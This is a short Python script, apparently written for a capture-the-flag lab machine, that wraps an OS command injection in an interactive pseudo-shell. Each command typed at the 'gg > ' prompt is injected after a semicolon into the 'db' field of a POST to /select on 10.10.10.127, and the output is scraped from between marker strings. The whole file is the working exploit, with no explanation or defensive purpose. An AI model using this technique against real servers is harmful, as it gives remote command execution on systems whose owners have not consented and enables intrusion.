import requests
import re 
from cmd import Cmd
from html.parser import HTMLParser
h=HTMLParser()
class Terminal(Cmd):
    prompt = 'gg > '
    def default(self,args):
        out = RunCmd(args)
        s = h.unescape(out)
        print(s)
def RunCmd(cmd):
    data = { 'db' : f"""gg; echo "boot";{cmd};echo 'root'""" } 
    r = requests.post('http://10.10.10.127/select',data=data)
    page = r.text
    m = re.search('boot(.*?)root',page,re.DOTALL)
    if m:
        return(m.group(1))
    else:
        return 1
term=Terminal()
term.cmdloop()
